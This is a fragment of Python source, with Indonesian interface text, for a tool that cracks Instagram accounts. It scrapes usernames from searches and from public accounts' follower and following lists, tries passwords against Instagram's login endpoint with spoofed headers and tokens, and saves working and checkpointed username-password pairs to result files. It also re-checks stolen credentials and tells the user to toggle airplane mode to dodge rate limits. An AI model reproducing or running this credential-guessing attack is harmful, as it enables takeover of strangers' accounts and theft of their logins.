                                         'X-CSRFToken': token.cookies['csrftoken'], 
                                         'X-Instagram-AJAX': '1d6caaf37cd2', 
                                         'X-IG-App-ID': '936619743392459', 
                                         'X-ASBD-ID': '437806', 
                                         'X-IG-WWW-Claim': '0', 
                                         'Content-Type': 'application/x-www-form-urlencoded', 
                                         'X-Requested-With': 'XMLHttpRequest', 
                                         'Content-Length': '347', 
                                         'Origin': 'https://www.instagram.com', 
                                         'Connection': 'keep-alive', 
                                         'Referer': 'https://www.instagram.com/accounts/login/' 
                                 } 
  
                                 param={ 
                                         "username": user, 
                                         "enc_password": "#PWD_INSTAGRAM_BROWSER:0:{}:{}".format(random.randint(1000000000, 99999999999),pw), 
                                         "optIntoOneTap": False, 
                                         "queryParams": {}, 
                                         "stopDeletionNonce": "", 
                                         "trustedDeviceRecords": {}} 
  
                                 x=s.post("https://www.instagram.com/accounts/login/ajax/",headers=headers,data=param) 
                                 x_jason=json.loads(x.text) 
                                 if "userId" in str(x_jason): 
                                         nama,pengikut,mengikut,postingan=self.APIinfo(user) 
                                         print(f"""\r{H}  ╭{C}{H} Ｂｅｒｈａｓｉｌ Ｌｏｇｉｎ 😈 
   {H}╞{C} 
   {H}╞{C} {H}NAMA : {H}{nama}{C} 
   {H}╞{C} {H}USERNAME : {H}{user}{C} 
   {H}╞{C} {H}PASSWORD : {H}{pw}{C} 
   {H}╞{C} {H}PENGIKUT : {H}{pengikut}{C} 
   {H}╞{C} {H}MENGIKUTI : {H}{mengikut}{C} 
   {H}╞{C} {H}POSTINGAN : {H}{postingan}{C} 
   {H}╞{C} 
   {H}╰{C} {H} SEMOGA HARIMU MENYENANGKAN :"( 
                                         """) 
                                         open(f"result/success-{day}.txt","a").write(f'{user}|{pw}|{pengikut}|{mengikut}\n') 
                                         success.append(user) 
                                         break 
  
                                 elif 'checkpoint_url' in str(x_jason): 
                                         nama,pengikut,mengikut,postingan=self.APIinfo(user) 
                                         print(f"""\r  {K}╭{C} Ｃｈｅｃｋｐｏｉｎｔ 😈 
   {K}╞{C} 
   {K}╞{C} NAMA : {K}{nama}{C} 
   {K}╞{C} USERNAME : {K}{user}{C} 
   {K}╞{C} PASSWORD : {K}{pw}{C} 
   {K}╞{C} PENGIKUT : {K}{pengikut}{C} 
   {K}╞{C} MENGIKUTI : {K}{mengikut}{C} 
   {K}╞{C} POSTINGAN : {K}{postingan}{C} 
   {K}╞{C} 
   {K}╰{K} ANDA KURANG GANTENG, NGENTOT 
                                         """) 
                                         open(f"result/checkpoint-{day}.txt","a").write(f'{user}|{pw}|{pengikut}|{mengikut}\n') 
                                         checkpoint.append(user) 
                                         break 
  
                                 elif 'Harap tunggu beberapa menit sebelum mencoba lagi.' in str(x.text): 
                                         sys.stdout.write(f"\r [{M}!{C}] {M} hidupkan mode pesawat 30 detik{C}");sys.stdout.flush();sleep(10) 
                                         self.crackAPI(user,pas,uaAPI) 
                                 else: 
                                         continue 
  
                         loop+=1 
                 except: 
                         self.crackAPI(user,pas,uaAPI) 
  
         def checkAPI(self,user,pw): 
                 try: 
                         token=s.get("https://www.instagram.com/",headers={"user-agent":User_Agent()}).content 
                         crf_token=re.findall(r"\"csrf_token\"\:\"(.*?)\"", str(token))[0] 
                         s.headers.update({ 
                                 'authority': 'www.instagram.com', 
                                 'x-ig-www-claim': 'hmac.AR08hbh0m_VdJjwWvyLFMaNo77YXgvW_0JtSSKgaLgDdUu9h', 
                                 'x-instagram-ajax': '82a581bb9399', 
                                 'content-type': 'application/x-www-form-urlencoded', 
                                 'accept': '*/*', 
                                 'user-agent': user_agent(), 
                                 'x-requested-with': 'XMLHttpRequest', 
                                 'x-csrftoken': crf_token, 
                                 'x-ig-app-id': '936619743392459', 
                                 'origin': 'https://www.instagram.com', 
                                 'sec-fetch-site': 'same-origin', 
                                 'sec-fetch-mode': 'cors', 
                                 'sec-fetch-dest': 'empty', 
                                 'referer': 'https://www.instagram.com/', 
                                 'accept-language': 'en-GB,en-US;q=0.9,en;q=0.8' 
                         }) 
  
                         param={ 
                                 "username": user, 
                                 "enc_password": "#PWD_INSTAGRAM_BROWSER:0:{}:{}".format(random.randint(1000000000, 99999999999),pw), 
                                 "optIntoOneTap": False, 
                                 "queryParams": {}, 
                                 "stopDeletionNonce": "", 
                                 "trustedDeviceRecords": {} 
                         } 
                         x=s.post("https://www.instagram.com/accounts/login/ajax/",data=param);sleep(1) 
                         x_jason=json.loads(x.text) 
                         if "userId" in x.text: 
                                 nama,pengikut,mengikut,postingan=self.APIinfo(user) 
                                 print(f"""\r    
   {H}╟{C} {H}Ｂｅｒｈａｓｉｌ Ｌｏｇｉｎ 
   {H}╟{C} {H}NAMA       : {H}{nama}{C} 
   {H}╟{C} {H}USERNAME : {H}{user}{C} 
   {H}╟{C} {H}Password  : {H}{pw}{C} 
   {H}╟{C} {H}Pengikut    : {H}{pengikut}{C} 
   {H}╟{C} {H}Mengikuti  : {H}{mengikut}{C} 
   {H}╟{C} {H}Postingan  : {H}{postingan}{C} 
   {H}╟{C} {U}Silahkan Login 
                                 """) 
                         elif 'checkpoint_url' in x.text: 
                                 nama,pengikut,mengikut,postingan=self.APIinfo(user) 
                                 print(f"""\r   
   {K}╟{C} Ｃｈｅｃｋｐｏｉｎｔ 
   {K}╟{C} FulName: {M}{nama}{C} 
   {K}╟{C} Username: {M}{user}{C} 
   {K}╟{C} Password: {M}{pw}{C} 
   {K}╟{C} Pengikut: {M}{pengikut}{C} 
   {K}╟{C} Mengikuti: {M}{mengikut}{C} 
   {K}╟{C} Postingan: {M}{postingan}{C} 
                                 """) 
                         elif 'Please wait a few minutes' in str(x.text): 
                                 sys.stdout.write(f"\r [{M}!{C}] {U} hidupkan mode pesawat 30 detik{C}");sys.stdout.flush();sleep(10) 
                                 self.checkAPI(user,pw) 
                 except: 
                         self.checkAPI(user,pw) 
  
         def menu(self): 
                 self.logo() 
                 c=input(f' >> ') 
                 if c=='': 
                         self.menu() 
                 elif c in ('1','01'): 
                         m=int(input(f'\n [{U}?{C}] Masukan jumlah target: '));print('') 
                         for i in range(m): 
                                 i+1 
                                 nama=input(f' [{U}>{C}] Masukan nama pencarian ({H}{len(internal)}{C}): ') 
                                 name=self.searchAPI(self.cookie,nama) 
                         self.passwordAPI(name) 
  
                 elif c in ('2','02'): 
                         print(f'\n [{P}✓{C}] Target harus bersifat publik jangan privat') 
                         m=input(f' [{P}?{C}] Masukan username instagram: ') 
  
                         id=self.idAPI(self.cookie,m) 
                         info=self.infoAPI(self.cookie,'https://i.instagram.com/api/v1/friendships/%s/followers/?count=100000',id) 
                         self.passwordAPI(info) 
  
                 elif c in ('3','03'): 
                         print(f'\n [{K}✓{C}] Target harus bersifat publik jangan privat') 
                         m=input(f' [{K}?{C}] Masukan username instagram: ') 
  
                         id=self.idAPI(self.cookie,m) 
                         info=self.infoAPI(self.cookie,'https://i.instagram.com/api/v1/friendships/%s/following/?count=100000',id) 
                         self.passwordAPI(info) 
  
  
                 elif c in ('4','04'): 
                         print('') 
                         for i in os.listdir('result'): 
                                 print(f' [{U}>{C}] {i}') 
                         c=input(f'\n {U}>>>{C} Masukan nama file: ') 
                         g=open("result/%s"%(c)).read().splitlines() 
                         print(f'\n [{U}+{C}] Total Result {H}{len(g)}{C}') 
                         print(f'\n [{M}!{C}] Proses mengecek status akun. silahkan tunggu sebentar\n') 
                         for s in g: 
                                 usr=s.split("|")[0] 
                                 pwd=s.split("|")[1] 
                                 self.checkAPI(usr,pwd) 
                         exit(f'\n\n [{U}#{C}] proses check selesai...') 
  
                 elif c in ('5','05'): 
                         print('') 
                         for i in os.listdir('result'): 
                                 print(f' [{U}>{C}] {i}') 
                         c=input(f'\n {U}>>>{C} Masukan nama file: ') 
                         g=open("result/%s"%(c)).read().splitlines() 
                         xx=c.split("-") 
                         xc=xx[0] 
                         print(f'\n [{U}>{C}] Total result yang di temukan [{H}{len(g)}{C}]') 
                         for s in g: 
                                 usr=s.split("|")[0] 
                                 pwd=s.split("|")[1] 
                                 fol=s.split("|")[2] 
                                 ful=s.split("|")[3] 
                                 if xc=="checkpoint": 
                                         print(f""" 
   {M}╟{C}] {M}Ｃｈｅｃｋｐｏｉｎｔ{C}: 
   {M}╟{C} 
   {M}╟{C} Username: {O}{usr}{C} 
   {M}╟{C} Password: {O}{pwd}{C} 
   {M}╟{C} Followers: {O}{fol}{C} 
   {M}╟{C} Following: {O}{ful}{C} 
                                         """);sleep(0.05) 
                                 else: 
                                         print(f""" 
   {H}╟{C}{H} Ｂｅｒｈａｓｉｌ Ｌｏｇｉｎ {C} 
   {H}╟{C}{H} Username : {H}{usr}{C} 
   {H}╟{C}{H} Password : {H}{pwd}{C} 
   {H}╟{C}{H} Pengikut : {H}{fol}{C} 
   {H}╟{C}{H} Mengikuti : {H}{ful}{C} 
                                         """);sleep(0.05) 
                 elif c in ('6','06'): 
                         global following 
                         six=0 
                         print(f'\n [{U}!{C}] Bot Unfollow-All Dijalankan\n') 
                         x=open('.kukis.log','r').read() 
                         x_id=re.findall('sessionid=(\d+)',x)[0] 
                         back=self.infoAPI(self.cookie,'https://i.instagram.com/api/v1/friendships/%s/following/?count=100000',x_id) 
                         for i in following: 
                                 six+=1 
                                 sleep(float( random.uniform(nyMnD*10,nyMxD*10) / 10 )) 
                                 six_id=self.sixAPI(i) 
                                 print(f' {str(six)}{U}}}{C} {i} {H}Unfollow-Berhasil{C}') 
                                 self.unfollowAPI(six_id,'5452333948',self.cookie) 
                                 #print(w) 
                         input(f'\n\n [{U}#{C}] Unfollow-all selesai...');self.menu() 
  
                 elif c in ('f','F'): 
                         self.BUG() 
                 elif c in ('y','Y'): 
                         self.ChangeLog() 
                 elif c in ('p','P'): 
                         self.Exit() 
  
                 else: 
                         self.menu() 
  
 if __name__=='__main__': 
         try: 
                 checkin() 
         except requests.exceptions.ConnectionError: 
                 exit(f'\n [{M}!{C}] Koneksi internet bermasalah')
